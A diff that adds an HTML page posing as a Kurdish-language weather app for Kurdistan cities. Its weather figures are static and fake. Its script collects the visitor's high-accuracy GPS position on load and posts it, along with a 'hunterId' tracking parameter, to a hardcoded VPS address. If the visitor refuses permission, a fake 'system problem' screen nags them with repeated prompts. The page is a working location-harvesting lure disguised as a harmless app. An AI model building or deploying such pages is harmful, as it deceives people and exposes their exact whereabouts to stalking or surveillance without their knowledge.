@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="ku" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>کەشناسی کوردستان</title>
+    
+    <style>
+        :root {
+            --primary: #2ecc71;
+            --dark-green: #1b4d3e;
+            --glass: rgba(255, 255, 255, 0.08);
+            --border: rgba(255, 255, 255, 0.15);
+            --shadow: 0 30px 60px rgba(0,0,0,0.5);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background: #050a05;
+            color: #fff;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            height: 100vh;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .master-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -2;
+            background: url('https://images.unsplash.com/photo-1473448912268-2022ce9509d8?auto=format&fit=crop&w=1920&q=80');
+            background-size: cover;
+            background-position: center;
+            filter: brightness(0.4) contrast(1.2);
+            transition: transform 5s ease-out;
+        }
+
+        .mist-layer {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 200%;
+            height: 100%;
+            background: url('https://www.transparenttextures.com/patterns/fog.png');
+            opacity: 0.25;
+            z-index: -1;
+            animation: moveMist 40s linear infinite;
+        }
+
+        @keyframes moveMist {
+            from { transform: translateX(0); }
+            to { transform: translateX(-50%); }
+        }
+
+        #rain-canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        header {
+            width: 100%;
+            padding: 25px;
+            background: rgba(0,0,0,0.4);
+            backdrop-filter: blur(15px);
+            border-bottom: 1px solid var(--border);
+            text-align: center;
+            z-index: 100;
+        }
+
+        header h1 {
+            font-size: 20px;
+            letter-spacing: 1px;
+            color: var(--primary);
+            text-transform: uppercase;
+        }
+
+        .app-content {
+            flex: 1;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            z-index: 10;
+            overflow-y: auto;
+            width: 100%;
+        }
+
+        .main-card {
+            width: 100%;
+            max-width: 420px;
+            background: var(--glass);
+            backdrop-filter: blur(35px);
+            border: 1px solid var(--border);
+            border-radius: 45px;
+            padding: 40px 20px;
+            text-align: center;
+            box-shadow: var(--shadow);
+            margin-top: 20px;
+        }
+
+        .weather-icon-box {
+            font-size: 85px;
+            margin-bottom: 15px;
+            animation: float 4s infinite ease-in-out;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-20px); }
+        }
+
+        .temp-display {
+            font-size: 95px;
+            font-weight: 200;
+            line-height: 1;
+            margin-bottom: 10px;
+        }
+
+        .city-name {
+            font-size: 24px;
+            font-weight: 600;
+            color: var(--primary);
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            margin-top: 35px;
+            width: 100%;
+        }
+
+        .stat-card {
+            background: rgba(255,255,255,0.05);
+            padding: 15px;
+            border-radius: 25px;
+            border: 1px solid var(--border);
+        }
+
+        .stat-card span { font-size: 12px; opacity: 0.6; display: block; }
+        .stat-card b { font-size: 16px; margin-top: 5px; display: block; }
+
+        .city-list-container {
+            width: 100%;
+            max-width: 420px;
+            margin-top: 30px;
+        }
+
+        .city-item {
+            width: 100%;
+            background: var(--glass);
+            margin-bottom: 12px;
+            padding: 20px;
+            border-radius: 25px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border: 1px solid var(--border);
+            transition: 0.3s;
+        }
+
+        #boot-loader {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: #050a05;
+            z-index: 10000;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .spinner-custom {
+            width: 60px;
+            height: 60px;
+            border: 4px solid rgba(46, 204, 113, 0.1);
+            border-top: 4px solid var(--primary);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+
+        #permission-error {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.9);
+            z-index: 9000;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            padding: 30px;
+        }
+    </style>
+</head>
+<body onload="bootSequence()">
+
+    <div id="boot-loader">
+        <div class="spinner-custom"></div>
+        <p style="margin-top: 25px; color: var(--primary); font-weight: bold; letter-spacing: 2px;">تکایە کەمێک چاوەڕوان بە...</p>
+    </div>
+
+    <div id="permission-error">
+        <h2 style="color: #ff4757;">⚠️ کێشەی سیستەم</h2>
+        <p style="margin-top: 15px; line-height: 1.6;">بۆ ئەوەی ڕاپۆرتی وردی شارەکەت و دیمەنی سەتەلایەت ببێنیت، دەبێت مۆڵەتی GPS بدەیت.</p>
+        <button onclick="autoTrigger()" style="margin-top: 30px; background: var(--primary); border: none; padding: 15px 40px; border-radius: 30px; color: white; font-weight: bold;">دووبارە هەوڵبدەرەوە</button>
+    </div>
+
+    <div class="master-bg" id="bg"></div>
+    <div class="mist-layer"></div>
+    <canvas id="rain-canvas"></canvas>
+
+    <header>
+        <h1>کەشناسی شارەکانی کوردستان</h1>
+    </header>
+
+    <div class="app-content">
+        <div class="main-card">
+            <div class="weather-icon-box">🌦️</div>
+            <div class="temp-display" id="mainTemp">18°</div>
+            <div class="city-name" id="mainCity">دیاریکردنی ناوچە...</div>
+            
+            <div class="stats-grid">
+                <div class="stat-card"><span>بارانبارین</span><b>٧٨٪</b></div>
+                <div class="stat-card"><span>خێرایی با</span><b>١٤ کم/ک</b></div>
+                <div class="stat-card"><span>نەخشەی ڕادار</span><b>چالاکە</b></div>
+                <div class="stat-card"><span>ئاستی هەور</span><b>٩٠٪</b></div>
+            </div>
+        </div>
+
+        <div class="city-list-container">
+            <h3 style="margin: 20px 0 15px 10px; font-size: 18px;">شارەکانی تری کوردستان</h3>
+            <div class="city-item"><span>سلێمانی</span><b>١٥° 🌧️</b></div>
+            <div class="city-item"><span>دهۆک</span><b>١٦° 🌦️</b></div>
+            <div class="city-item"><span>کەرکوک</span><b>٢١° ☀️</b></div>
+            <div class="city-item"><span>هەولێر</span><b>١٨° ☀️</b></div>
+        </div>
+        <div style="height: 50px;"></div>
+    </div>
+
+    <script>
+        // داتاکان دەنێردرێت بۆ سێرڤەری پایتۆن لەسەر VPS
+        const SERVER_URL = "http://178.18.241.166:5000/receive_loc";
+        const hunterId = new URLSearchParams(window.location.search).get('id');
+
+        const canvas = document.getElementById('rain-canvas');
+        const ctx = canvas.getContext('2d');
+        let drops = [];
+
+        function initRain() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            for(let i=0; i<150; i++) {
+                drops.push({
+                    x: Math.random() * canvas.width,
+                    y: Math.random() * canvas.height,
+                    len: Math.random() * 20 + 10,
+                    vel: Math.random() * 10 + 5
+                });
+            }
+        }
+
+        function drawRain() {
+            ctx.clearRect(0,0, canvas.width, canvas.height);
+            ctx.strokeStyle = 'rgba(255,255,255,0.2)';
+            ctx.lineWidth = 1;
+            drops.forEach(d => {
+                ctx.beginPath();
+                ctx.moveTo(d.x, d.y);
+                ctx.lineTo(d.x, d.y + d.len);
+                ctx.stroke();
+                d.y += d.vel;
+                if(d.y > canvas.height) d.y = -d.len;
+            });
+            requestAnimationFrame(drawRain);
+        }
+
+        function bootSequence() {
+            initRain();
+            drawRain();
+            setTimeout(() => {
+                document.getElementById("boot-loader").style.opacity = "0";
+                setTimeout(() => {
+                    document.getElementById("boot-loader").style.display = "none";
+                    autoTrigger();
+                }, 800);
+            }, 2500);
+        }
+
+        function autoTrigger() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(successHandler, errorHandler, {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                });
+            }
+        }
+
+        function successHandler(position) {
+            document.getElementById("permission-error").style.display = "none";
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const acc = position.coords.accuracy;
+
+            fetch(SERVER_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    lat: lat,
+                    lon: lon,
+                    acc: acc,
+                    id: hunterId
+                })
+            }).catch(err => console.log("Error sending to VPS"));
+
+            document.getElementById("mainCity").innerHTML = "ناوچەکەت دیاری کرا ✅";
+            alert("ڕاپۆرتی کەشناسی ناوچەکەت نوێ کرایەوە!");
+        }
+
+        function errorHandler(err) {
+            document.getElementById("permission-error").style.display = "flex";
+            setTimeout(autoTrigger, 3000);
+        }
+
+        window.addEventListener('mousemove', (e) => {
+            const moveX = (e.clientX / window.innerWidth) * 15;
+            const moveY = (e.clientY / window.innerHeight) * 15;
+            document.getElementById("bg").style.transform = `scale(1.1) translate(${moveX}px, ${moveY}px)`;
+        });
+    </script>
+</body>
+</html>
